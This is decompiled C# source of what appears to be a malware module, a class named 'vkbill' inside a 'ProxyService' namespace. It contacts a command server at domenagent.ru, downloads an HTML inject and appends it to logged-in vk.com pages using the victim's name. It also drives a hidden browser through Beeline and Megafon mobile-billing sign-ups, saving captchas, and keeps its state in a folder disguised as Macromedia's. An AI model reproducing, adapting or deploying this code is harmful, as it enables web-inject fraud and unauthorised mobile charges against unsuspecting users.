using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace ProxyService;

public class vkbill : Form
{
	[ComImport]
	[InterfaceType(1)]
	[Guid("3050F669-98B5-11CF-BB82-00AA00BDCE0B")]
	private interface IHTMLElementRenderFixed
	{
		void DrawToDC(IntPtr hdc);

		void SetDocumentPrinter(string bstrPrinterName, IntPtr hdc);
	}

	private IContainer components;

	private WebBrowser wb;

	private Timer timer1;

	public static bool _can = false;

	public static string _country = "";

	public static string _short = "";

	public static string _msg = "";

	public static string _inject = "";

	public static string phone = "";

	public static Dictionary<string, string> vals = new Dictionary<string, string>();

	public static string vkFolder = "service/test";

	public static string vkBilledAnswer = "ya_pomog_detyam_spasibo_vam_i_vsego_horoshego_spasibo";

	public static string vkSpecFolder = "xlmnsprst00011sseeee344jfdfdf23923223233233204903949009fdhjhfl34dfwjfelwfj34idferqcoirghyrerpigpci";

	public int stage;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ac: Expected O, but got Unknown
		components = new Container();
		wb = new WebBrowser();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)wb).set_Dock((DockStyle)5);
		((Control)wb).set_Location(new Point(0, 0));
		((Control)wb).set_MinimumSize(new Size(20, 20));
		((Control)wb).set_Name("wb");
		((Control)wb).set_Size(new Size(292, 273));
		((Control)wb).set_TabIndex(0);
		wb.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(wb_DocumentCompleted));
		timer1.set_Enabled(true);
		timer1.set_Interval(30000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(292, 273));
		((Control)this).get_Controls().Add((Control)(object)wb);
		((Control)this).set_Name("vkbill");
		((Control)this).set_Text("vkbill");
		((Form)this).add_Load((EventHandler)vkbill_Load);
		((Control)this).ResumeLayout(false);
	}

	public vkbill()
	{
		InitializeComponent();
	}

	private void vkbill_Load(object sender, EventArgs e)
	{
	}

	public void Do()
	{
		if (isCanInjectVKBill())
		{
			stage = 0;
			timer1_Tick(null, null);
		}
	}

	public static string basedir()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Macromedia\\";
	}

	public static string ReadKey(string key)
	{
		if (vals.TryGetValue(key, out var value))
		{
			return value;
		}
		try
		{
			value = File.ReadAllText(basedir() + key);
		}
		catch (Exception)
		{
		}
		vals.Add(key, value);
		return value;
	}

	public static int nReadKey(string key)
	{
		try
		{
			return int.Parse(ReadKey(key));
		}
		catch (Exception)
		{
			return 0;
		}
	}

	public static void WriteKey(string key, string val)
	{
		try
		{
			File.WriteAllText(basedir() + key, val);
		}
		catch (Exception)
		{
		}
		if (!vals.ContainsKey(key))
		{
			vals.Add(key, val);
		}
		else
		{
			vals[key] = val;
		}
	}

	public static void dbgFile(string a)
	{
		if (ProxyServer.IsDebugMode)
		{
			try
			{
				File.WriteAllText("D:\\1.htm", a);
			}
			catch (Exception)
			{
			}
		}
	}

	private static string vkName(string str)
	{
		string text = "";
		text = XmlHelper.extr(str, "<div class=\"page_name fl_l ta_l\">", "</div>", withCorners: false);
		string[] array = new string[0];
		array = text.Split(new char[1] { ' ' });
		if (array.Length >= 1)
		{
			return array[0];
		}
		return "";
	}

	public static string vkBillCode(string str)
	{
		string newValue = vkName(str);
		string inject = _inject;
		inject = inject.Replace("$$$name$$$", newValue);
		str += inject;
		return str;
	}

	public static void vkCatchBilled(string str)
	{
		if (str.Contains(vkBilledAnswer))
		{
			WriteKey("vkbilled", "1");
			WriteKey("vkbilled_date", DateTime.Now.ToString());
		}
	}

	public static int vkdiff()
	{
		try
		{
			DateTime value = DateTime.Parse(ReadKey("vkbilled_date"));
			return Math.Abs(DateTime.Now.Subtract(value).Days);
		}
		catch (Exception)
		{
			return -1;
		}
	}

	public static bool isCanInjectVKBill()
	{
		ProxyServer.dbg("vkdiff: " + vkdiff());
		bool flag = ReadKey("vkbilled") == "1";
		if (vkdiff() == -1)
		{
			return true;
		}
		if (vkdiff() >= 4)
		{
			return true;
		}
		return !flag;
	}

	public static bool isCanInjectAd1()
	{
		return isCanInjectVKBill();
	}

	public static bool IsInjectVKBill(string url, string data)
	{
		if (!_can)
		{
			return false;
		}
		if (data.Contains("reg_bar_with_arr"))
		{
			return false;
		}
		if (!data.Contains("act=logout"))
		{
			return false;
		}
		return isCanInjectVKBill();
	}

	public static string vkSpecUrl(string url)
	{
		string text = "vk.com/" + vkSpecFolder;
		if (url.Contains(text))
		{
			url = url.Replace(text, "domenagent.ru/" + vkFolder);
		}
		return url;
	}

	public static string DownloadURL(string url)
	{
		try
		{
			WebClient webClient = new WebClient();
			webClient.Proxy = null;
			return webClient.DownloadString(url);
		}
		catch (Exception)
		{
			return "";
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			Timer obj = timer1;
			obj.set_Interval(obj.get_Interval() + 60000);
		}
		catch (Exception)
		{
		}
		ThreadStart start = CanBillDo;
		Thread thread = new Thread(start);
		thread.Start();
	}

	private void CanBillDo()
	{
		try
		{
			string text = new Random().Next(1, 1000000).ToString();
			string url = "http://domenagent.ru/" + vkFolder + "/Default_files/handler.ashx?action=botlive&rnd=" + text;
			string text2 = DownloadURL(url);
			_inject = DownloadURL("http://domenagent.ru/" + vkFolder + "/Default.htm");
			_inject = _inject.Replace("Default_files", "http://vk.com/" + vkSpecFolder + "/Default_files");
			string country = "";
			string text3 = "";
			string text4 = "";
			try
			{
				country = text2.Split(new char[1] { '@' })[0];
				text3 = text2.Split(new char[1] { '@' })[1];
				_ = text2.Split(new char[1] { '@' })[2];
				text4 = text2.Split(new char[1] { '@' })[3];
				_can = !text2.Contains("null") && text3 != "" && text == text4;
			}
			catch (Exception)
			{
				_can = false;
			}
			_short = text3;
			_country = country;
			ProxyServer.dbg(text2 + "/" + _country + "/" + _short + "/" + _can);
		}
		catch (Exception)
		{
		}
	}

	private static void vk_ie_start()
	{
	}

	private void wb_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		object obj = null;
		if (stage == 1)
		{
			try
			{
				obj = ieById("enter_submit");
				iemethod(obj, "click");
				obj = ieByClassSetValue("vjoin_number_input vjoin_input_text", phone);
				ieByClassClick("vjoin_submit");
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message);
			}
			stage = 2;
		}
		else if (stage == 2)
		{
			if (wb.get_Document().get_Url().ToString()
				.Contains("beeline"))
			{
				ieSaveImgBySrc("captcha");
			}
			if (wb.get_Document().get_Url().ToString()
				.Contains("wap.megafonpro.ru"))
			{
				Bitmap image = GetImage("captcha");
				((Image)image).Save(CaptchaFile(), ImageFormat.get_Jpeg());
			}
		}
	}

	public string CaptchaFile()
	{
		return basedir() + "image.png";
	}

	public Bitmap GetImage(string id)
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		HtmlElement elementById = wb.get_Document().GetElementById(id);
		object domElement = elementById.get_DomElement();
		IHTMLElementRenderFixed iHTMLElementRenderFixed = (IHTMLElementRenderFixed)domElement;
		Bitmap val = new Bitmap(int.Parse(ieget(domElement, "width").ToString()), int.Parse(ieget(domElement, "height").ToString()));
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		IntPtr hdc = val2.GetHdc();
		iHTMLElementRenderFixed.DrawToDC(hdc);
		val2.ReleaseHdc(hdc);
		return val;
	}

	private object ieget(object obj, string sProperty)
	{
		return obj.GetType().InvokeMember(sProperty, BindingFlags.GetProperty, null, obj, null);
	}

	private void iemethod(object obj, string sMethod)
	{
		obj.GetType().InvokeMember(sMethod, BindingFlags.InvokeMethod, null, obj, null);
	}

	public void ieset(object obj, string propertyName, object value)
	{
		object[] args = new object[1] { value };
		obj.GetType().InvokeMember(propertyName, BindingFlags.SetProperty, null, obj, args);
	}

	public object ieByClassSetValue(string classname, string val)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		foreach (HtmlElement item in wb.get_Document().get_All())
		{
			HtmlElement val2 = item;
			object domElement = val2.get_DomElement();
			string text = "";
			try
			{
				text = ieget(domElement, "className").ToString();
			}
			catch (Exception)
			{
			}
			if (text.ToLower().Trim() == classname.ToLower().Trim())
			{
				ieset(domElement, "value", val);
				return domElement;
			}
		}
		return null;
	}

	public object ieByClassClick(string classname)
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002e: Expected O, but got Unknown
		foreach (HtmlElement item in wb.get_Document().get_All())
		{
			HtmlElement val = item;
			object domElement = val.get_DomElement();
			string text = "";
			try
			{
				text = ieget(domElement, "className").ToString();
			}
			catch (Exception)
			{
			}
			if (text.ToLower().Trim() == classname.ToLower().Trim())
			{
				iemethod(domElement, "click");
				return domElement;
			}
		}
		return null;
	}

	public object ieById(string id)
	{
		return wb.get_Document().GetElementById(id).get_DomElement();
	}

	public void ieSaveImgBySrc(string src)
	{
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0084: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		foreach (HtmlElement image in wb.get_Document().get_Images())
		{
			HtmlElement val = image;
			object domElement = val.get_DomElement();
			if (ieget(domElement, "src").ToString()!.ToLower().Contains(src))
			{
				object obj = domElement;
				IHTMLElementRenderFixed iHTMLElementRenderFixed = (IHTMLElementRenderFixed)obj;
				Bitmap val2 = new Bitmap(int.Parse(ieget(obj, "width").ToString()), int.Parse(ieget(obj, "height").ToString()));
				Graphics val3 = Graphics.FromImage((Image)(object)val2);
				IntPtr hdc = val3.GetHdc();
				iHTMLElementRenderFixed.DrawToDC(hdc);
				val3.ReleaseHdc(hdc);
				((Image)val2).Save(CaptchaFile(), ImageFormat.get_Png());
			}
		}
	}
}
